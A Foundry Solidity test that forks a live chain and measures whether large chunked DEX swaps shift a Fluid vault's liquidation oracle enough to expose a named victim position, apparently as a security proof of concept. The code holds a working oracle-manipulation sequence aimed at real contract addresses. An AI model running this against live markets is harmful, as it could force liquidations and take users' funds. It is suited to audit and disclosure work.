// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test} from "forge-std/Test.sol";

interface IERC20Availability {
    function decimals() external view returns (uint8);
}

interface IFluidDexAvailability {
    function swapOut(bool swap0to1, uint256 amountOut, uint256 amountInMax, address to)
        external payable returns (uint256 amountIn);
}

interface IFluidOracleAvailability {
    function getExchangeRateLiquidate() external view returns (uint256);
}

interface IFluidVaultAvailability {
    function readFromStorage(bytes32 slot) external view returns (uint256);
}

interface IFluidFactoryAvailability {
    function owner() external view returns (address);
}

interface IFluidVaultResolverAvailability {
    struct LiquidationStruct {
        address vault;
        address token0In;
        address token0Out;
        address token1In;
        address token1Out;
        uint256 inAmt;
        uint256 outAmt;
        uint256 inAmtWithAbsorb;
        uint256 outAmtWithAbsorb;
        bool absorbAvailable;
    }

    function getVaultLiquidation(address vault, uint256 tokenInAmt)
        external returns (LiquidationStruct memory liquidationData);
}

contract PlasmaVaultT4LiquidationAvailabilityTest is Test {
    address internal constant FACTORY = 0x324c5Dc1fC42c7a4D43d92df1eBA58a54d13Bf2d;
    address internal constant VAULT = 0x6E0cDB09eb33cD3894C905E0DFF9289b95a86FFF;
    address internal constant RESOLVER = 0xA5C3E16523eeeDDcC34706b0E6bE88b4c6EA95cC;
    address internal constant ORACLE = 0x029E6fF2173ff6c9e61787Fa7A3cfF1117D957b6;
    address internal constant DEX = 0x080574D224E960c272e005aA03EFbe793f317640;
    address internal constant TOKEN0 = 0xb77E872A68C62CfC0dFb02C067Ecc3DA23B4bbf3;
    address internal constant TOKEN1 = 0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb;

    uint256 internal constant VICTIM_NFT = 2580;
    uint256 internal constant X19 = (1 << 19) - 1;
    uint256 internal constant X20 = (1 << 20) - 1;

    event AvailabilityState(
        string phase,
        uint256 forkBlock,
        uint256 victimNft,
        int256 victimTick,
        int256 topTick,
        uint256 liquidationRate,
        uint256 inAmt,
        uint256 outAmt,
        uint256 inAmtWithAbsorb,
        uint256 outAmtWithAbsorb,
        bool absorbAvailable
    );

    event ManipulationSummary(
        uint256 successfulChunks,
        uint256 totalOutputToken0,
        uint256 totalInputToken1,
        uint256 reverseInputToken0,
        int256 roundTripToken0,
        uint256 rateBefore,
        uint256 rateDuring,
        uint256 rateAfter,
        int256 driftDuring,
        uint256 driftPpm
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("PLASMA_RPC_URL"), vm.envUint("PLASMA_FORK_BLOCK"));
        assertEq(block.chainid, 9745, "unexpected chain");
        assertGt(VAULT.code.length, 0, "vault missing");
        assertGt(RESOLVER.code.length, 0, "resolver missing");
        assertGt(DEX.code.length, 0, "dex missing");
        _fundAndApprove(TOKEN0);
        _fundAndApprove(TOKEN1);
    }

    function test_realMarketLiquidationAvailabilityBeforeDuringAfterDrift() public {
        uint256 rateBefore = IFluidOracleAvailability(ORACLE).getExchangeRateLiquidate();
        _emitAvailability("before", rateBefore);

        uint256 chunkOutput = 250_000 * (10 ** uint256(IERC20Availability(TOKEN0).decimals()));
        uint256[32] memory forwardInputs;
        uint256 successfulChunks;
        uint256 totalOutput;
        uint256 totalInput;

        for (uint256 i; i < 32; ++i) {
            (bool ok, bytes memory data) = DEX.call(
                abi.encodeWithSelector(
                    IFluidDexAvailability.swapOut.selector,
                    false,
                    chunkOutput,
                    type(uint256).max,
                    address(this)
                )
            );
            if (!ok || data.length < 32) break;
            uint256 amountIn = abi.decode(data, (uint256));
            forwardInputs[i] = amountIn;
            successfulChunks = i + 1;
            totalOutput += chunkOutput;
            totalInput += amountIn;
        }

        uint256 rateDuring = IFluidOracleAvailability(ORACLE).getExchangeRateLiquidate();
        _emitAvailability("during", rateDuring);

        uint256 totalReverseInput;
        for (uint256 i = successfulChunks; i > 0; --i) {
            uint256 token1Out = forwardInputs[i - 1];
            (bool ok, bytes memory data) = DEX.call(
                abi.encodeWithSelector(
                    IFluidDexAvailability.swapOut.selector,
                    true,
                    token1Out,
                    type(uint256).max,
                    address(this)
                )
            );
            require(ok && data.length >= 32, "reverse failed");
            totalReverseInput += abi.decode(data, (uint256));
        }

        uint256 rateAfter = IFluidOracleAvailability(ORACLE).getExchangeRateLiquidate();
        _emitAvailability("after", rateAfter);

        int256 driftDuring = int256(rateDuring) - int256(rateBefore);
        uint256 absoluteDrift = driftDuring >= 0 ? uint256(driftDuring) : uint256(-driftDuring);
        emit ManipulationSummary(
            successfulChunks,
            totalOutput,
            totalInput,
            totalReverseInput,
            int256(totalOutput) - int256(totalReverseInput),
            rateBefore,
            rateDuring,
            rateAfter,
            driftDuring,
            (absoluteDrift * 1_000_000) / rateBefore
        );
    }

    function _emitAvailability(string memory phase, uint256 rate) internal {
        IFluidVaultResolverAvailability.LiquidationStruct memory data =
            IFluidVaultResolverAvailability(RESOLVER).getVaultLiquidation(VAULT, 0);
        emit AvailabilityState(
            phase,
            block.number,
            VICTIM_NFT,
            _positionTick(VICTIM_NFT),
            _topTick(),
            rate,
            data.inAmt,
            data.outAmt,
            data.inAmtWithAbsorb,
            data.outAmtWithAbsorb,
            data.absorbAvailable
        );
    }

    function _positionTick(uint256 nftId) internal returns (int256 tick) {
        vm.prank(IFluidFactoryAvailability(FACTORY).owner());
        uint256 positionData = IFluidVaultAvailability(VAULT).readFromStorage(
            keccak256(abi.encode(nftId, uint256(3)))
        );
        if ((positionData & 1) == 1) return type(int256).min;
        uint256 encoded = (positionData >> 2) & X19;
        return (positionData & 2) == 2 ? int256(encoded) : -int256(encoded);
    }

    function _topTick() internal returns (int256 topTick) {
        vm.prank(IFluidFactoryAvailability(FACTORY).owner());
        uint256 vaultVariables = IFluidVaultAvailability(VAULT).readFromStorage(bytes32(uint256(0)));
        uint256 encoded = (vaultVariables >> 2) & X20;
        if (encoded == 0) return type(int256).min;
        if ((encoded & 1) == 1) return int256((encoded >> 1) & X19);
        return -int256((encoded >> 1) & X19);
    }

    function _fundAndApprove(address token) internal {
        uint8 decimals_ = IERC20Availability(token).decimals();
        deal(token, address(this), 100_000_000 * (10 ** uint256(decimals_)));
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSignature("approve(address,uint256)", DEX, type(uint256).max)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }
}
